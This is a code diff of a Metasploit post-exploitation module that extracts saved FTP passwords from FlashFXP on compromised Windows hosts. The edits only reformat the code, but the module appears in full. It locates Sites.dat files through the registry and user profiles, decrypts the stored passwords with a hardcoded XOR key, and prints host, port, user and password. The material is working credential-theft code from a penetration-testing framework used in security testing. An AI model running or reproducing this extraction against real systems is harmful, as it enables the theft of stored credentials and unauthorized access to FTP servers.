@@ -3,36 +3,39 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Windows Gather FlashFXP Saved Password Extraction',
-      'Description'   => %q{
-        This module extracts weakly encrypted saved FTP Passwords from FlashFXP. It
-        finds saved FTP connections in the Sites.dat file. },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'theLightCosine'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather FlashFXP Saved Password Extraction',
+        'Description' => %q{
+          This module extracts weakly encrypted saved FTP Passwords from FlashFXP. It
+          finds saved FTP connections in the Sites.dat file.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'theLightCosine'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   def run
-    #Checks if the Site data is stored in a generic location  for all users
+    # Checks if the Site data is stored in a generic location  for all users
     flash_reg = "HKLM\\SOFTWARE\\FlashFXP"
     flash_reg_ver = registry_enumkeys("#{flash_reg}")
 
-    #Ini paths
+    # Ini paths
     @fxppaths = []
 
     unless flash_reg_ver.nil?
-        software_key = "#{flash_reg}\\#{flash_reg_ver.join}"
-        generic_path = registry_getvaldata(software_key, "InstallerDataPath") || ""
+      software_key = "#{flash_reg}\\#{flash_reg_ver.join}"
+      generic_path = registry_getvaldata(software_key, "InstallerDataPath") || ""
       unless generic_path.include? "%APPDATA%"
         @fxppaths << generic_path + "\\Sites.dat"
       end
@@ -40,7 +43,8 @@ class MetasploitModule < Msf::Post
 
     grab_user_profiles().each do |user|
       next if user['AppData'] == nil
-      tmpath= user['AppData'] + '\\FlashFXP\\'
+
+      tmpath = user['AppData'] + '\\FlashFXP\\'
       get_ver_dirs(tmpath)
     end
 
@@ -53,6 +57,7 @@ class MetasploitModule < Msf::Post
     begin
       session.fs.dir.foreach(path) do |sub|
         next if sub =~ /^(\.|\.\.)$/
+
         @fxppaths << "#{path}#{sub}\\Sites.dat"
       end
     rescue
@@ -62,7 +67,7 @@ class MetasploitModule < Msf::Post
 
   def get_ini(filename)
     begin
-      config = client.fs.file.new(filename,'r')
+      config = client.fs.file.new(filename, 'r')
       parse = config.read
       ini = Rex::Parser::Ini.from_s(parse)
 
@@ -76,6 +81,7 @@ class MetasploitModule < Msf::Post
         epass = ini[group]['pass']
         port = ini[group]['port']
         next if epass == nil or epass == ""
+
         passwd = decrypt(epass)
 
         print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
@@ -112,16 +118,16 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt(pwd)
-    key =  "yA36zA48dEhfrvghGRg57h5UlDv3"
+    key = "yA36zA48dEhfrvghGRg57h5UlDv3"
     pass = ""
     cipher = [pwd].pack("H*")
 
-    (0..(cipher.length)-2).each do |index|
-      xored = cipher[index + 1,1].unpack("C").first ^ key[index,1].unpack("C").first
-      if ((xored - cipher[index,1].unpack("C").first < 0))
+    (0..(cipher.length) - 2).each do |index|
+      xored = cipher[index + 1, 1].unpack("C").first ^ key[index, 1].unpack("C").first
+      if ((xored - cipher[index, 1].unpack("C").first < 0))
         xored += 255
       end
-      pass << (xored - cipher[index,1].unpack("C").first).chr
+      pass << (xored - cipher[index, 1].unpack("C").first).chr
     end
     return pass
   end
